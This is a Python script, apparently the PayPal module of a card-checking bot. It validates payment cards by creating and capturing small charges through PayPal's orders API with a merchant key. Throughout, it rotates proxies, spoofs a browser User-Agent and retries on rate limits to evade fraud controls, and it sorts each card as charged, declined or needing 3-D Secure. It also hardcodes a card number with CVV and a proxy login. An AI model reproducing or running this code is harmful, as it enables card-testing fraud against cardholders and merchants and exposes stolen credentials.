"""PayPal DIRECT merchant lane (PayPal-Key style) — from /root/paypal.py.

OAuth client-credentials → /v2/checkout/orders with payment_source.card embedded
→ capture if approved. Verdicts carry real issuer codes (5120-class).
Proxy rotation: every call takes proxy_str = host:port:user:pass | http://u:p@h:p | file-pool default.
"""
import time, uuid, random, os, threading

import requests as rq

BASE = "https://api-m.paypal.com"
_DIR = os.path.dirname(os.path.abspath(__file__))
POOL_FILE = os.path.join(_DIR, "pp_direct_proxy_pool.txt")

DEFAULT_PROXY_POOL = ["64.4.168.78:8080:TubeP133662:UcosEYEEWh2GwdF5"]

RSA = threading.local()

def _pool():
    # prefer the live global proxy pool (populated via /gproxyadd + /gproxyreload)
    # so the PayPal lane rotates across live proxies instead of stale hardcoded ones
    try:
        from proxy import get_alive_pool_http
        live = get_alive_pool_http()
        if live:
            return live
    except Exception:
        pass
    try:
        lines = [l.strip() for l in open(POOL_FILE, encoding="utf-8", errors="ignore") if l.strip()]
        if lines:
            return lines
    except Exception:
        pass
    return DEFAULT_PROXY_POOL

def _fmt_proxy(p):
    if not p:
        return None
    p = p.strip()
    if p.startswith("http"):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

def _next_proxy():
    pool = _pool()
    tag = getattr(RSA, "idx", 0)
    RSA.idx = tag + 1
    return _fmt_proxy(pool[tag % len(pool)])

def _s(proxy_str):
    sess = rq.Session()
    px = proxy_str or _next_proxy()
    px = _fmt_proxy(px)
    if px:
        sess.proxies = {"http": px, "https": px}
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"})
    return sess

_CACHE = {"tok": None, "cid": None, "t": 0.0}
_CACHE_LOCK = threading.Lock()

def get_token(cid, sec, proxy_str=None):
    with _CACHE_LOCK:
        if _CACHE["tok"] and _CACHE["cid"] == cid and time.time() - _CACHE["t"] < 1500:
            return _CACHE["tok"]
    s = _s(proxy_str)
    r = s.post(f"{BASE}/v1/oauth2/token", auth=(cid, sec),
               data={"grant_type": "client_credentials"},
               headers={"Accept": "application/json"}, timeout=10)
    j = r.json()
    tok = j.get("access_token")
    if tok:
        with _CACHE_LOCK:
            _CACHE.update({"tok": tok, "cid": cid, "t": time.time()})
    return tok

def _brand(n):
    if n.startswith("4"): return "VISA"
    if n[:1] in "5" or (n[:2].isdigit() and 22 <= int(n[:2]) <= 27): return "MASTER_CARD"
    if n[:2] in ("34", "37"): return "AMEX"
    return "VISA"

def _run_once(cc, mm, yy, cvv, progress_callback=None, proxy_str=None,
              client_id: str = None, client_secret: str = None,
              amount: str = "1.00", **billing):
    """Direct merchant lane. Returns {status, response, decline_code, decline_description, time_take}."""
    t0 = time.time()
    # single key source: gates/paypal_checker.py
    from gates.paypal_checker import CLIENT_ID as _cid, CLIENT_SECRET as _sec
    cid = client_id or _cid
    sec = client_secret or _sec
    out = {"status": "ERROR", "response": "init", "decline_code": None,
           "decline_description": None, "time_take": 0.0}
    try:
        tok = get_token(cid, sec, proxy_str)
        if not tok:
            out["response"] = "Auth Failed — keys invalid or restricted"
            out["time_take"] = round(time.time() - t0, 2)
            return out
        first = billing.get("firstName", "John"); last = billing.get("lastName", "Doe")
        a1 = billing.get("address1", "12 Main St"); city = billing.get("city", "New York")
        st = billing.get("state", "NY"); zp = billing.get("zip", "10011"); cn = (billing.get("country", "US")).upper()[:2]
        order = {
            "intent": "CAPTURE",
            "purchase_units": [{"amount": {"currency_code": "USD", "value": f"{float(amount):.2f}"}, "description": "Payment"}],
            "payment_source": {"card": {
                "number": cc, "expiry": f"{('20'+yy) if len(yy)==2 else yy}-{mm}",
                "security_code": cvv, "name": f"{first} {last}",
                "billing_address": {"address_line_1": a1, "admin_area_2": city,
                                    "admin_area_1": st, "postal_code": zp, "country_code": cn},
                "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}}},
        }
        s = _s(proxy_str)
        H = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json",
             "Accept": "application/json", "PayPal-Request-Id": str(uuid.uuid4()),
             "Prefer": "return=representation"}
        r = s.post(f"{BASE}/v2/checkout/orders", headers=H, json=order, timeout=12)
        oj = r.json()
        if r.status_code not in (200, 201):
            msgs = [d.get("description") or d.get("issue") for d in (oj.get("details") or []) if isinstance(d, dict)]
            code = (msgs[0] if msgs else oj.get("name") or oj.get("message") or ""
                    ).replace("Payer cannot pay for this transaction. Please contact the payer to find other ways to pay for this transaction.", "PAYER_CANNOT_PAY")
            out.update({"status": "DECLINED", "response": code or (oj.get("text", "") or "RISK_DECLINE")[:60],
                        "decline_code": code[:40] if code else None,
                        "decline_description": code[:40] if code else None})
            out["time_take"] = round(time.time() - t0, 2)
            return out
        oid = oj.get("id", "")
        status = oj.get("status", "")
        if status == "COMPLETED":
            out.update({"status": "CHARGED", "response": f"COMPLETED | {oid}"})
            out["time_take"] = round(time.time() - t0, 2); return out
        links = oj.get("links", [])
        if any(l.get("rel") in ("approve", "payer-action") for l in links):
            out.update({"status": "REQUIRES_ACTION", "response": "3DS_REQUIRED",
                        "decline_code": "3DS_REQUIRED", "decline_description": "3DS_REQUIRED"})
            out["time_take"] = round(time.time() - t0, 2); return out
        card_info = (oj.get("payment_source") or {}).get("card", {})
        authr = card_info.get("authentication_result", {}).get("liability_shift", "")
        H2 = dict(H); H2["PayPal-Request-Id"] = str(uuid.uuid4())
        r2 = s.post(f"{BASE}/v2/checkout/orders/{oid}/capture", headers=H2, json={}, timeout=12)
        cj = r2.json()
        if r2.status_code in (200, 201) and cj.get("status") == "COMPLETED":
            out.update({"status": "CHARGED", "response": f"COMPLETED | {oid}",
                        "decline_code": None, "decline_description": None})
        else:
            msgs = [d.get("description") or d.get("issue") for d in (cj.get("details") or []) if isinstance(d, dict)]
            code = (msgs[0] if msgs else cj.get("message") or cj.get("name") or str(cj.get("status", "DECLINED")))
            out.update({"status": "DECLINED", "response": code[:70],
                        "decline_code": (msgs[0][:40] if msgs else str(cj.get("name",""))[:40]),
                        "decline_description": (msgs[0][:60] if msgs else None)})
        out["liability_shift"] = authr
    except Exception as e:
        out["response"] = f"{type(e).__name__}: {str(e)[:90]}"
    out["time_take"] = round(time.time() - t0, 2)
    return out

if __name__ == "__main__":
    print(run_check("5155998195462368", "08", "29", "376", amount="1.00"))


# ── retry wrapper: rotates proxies/errors only; card verdicts are final ──
_TRANSIENT_MARKERS = ("RATE_LIMIT", "Retry", "time", "Timeout", "Connection", "PAYPAL_ERROR",
                      "Unexpected", "internal")

def run_check(cc, mm, yy, cvv, progress_callback=None, proxy_str=None,
              client_id: str = None, client_secret: str = None,
              amount: str = "1.00", retries: int = 8, **billing):
    attempts = retries + 1
    deadline = time.time() + 40  # hard cap — never hang a caller
    out = None
    for i in range(attempts):
        if i and time.time() > deadline:
            break
        try:
            out = _run_once(cc, mm, yy, cvv, progress_callback=progress_callback,
                            proxy_str=proxy_str, client_id=client_id,
                            client_secret=client_secret, amount=amount, **billing)
        except Exception as e:
            out = {"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:80]}",
                   "decline_code": None, "decline_description": None, "time_take": 0.0}
        status = str(out.get("status","")).upper()
        resp = str(out.get("response","")).upper()
        retryable = status == "ERROR" or any(m in resp for m in ("RATE_LIMIT","TIME","CONNECTION"))
        if not retryable:
            return out
        # rotate pool proxy for the next attempt — instant (no backoff)
        pool = _pool()
        nxt = pool[(getattr(RSA, "idx", 0) + i + 1) % len(pool)]
        proxy_str = nxt
    return out
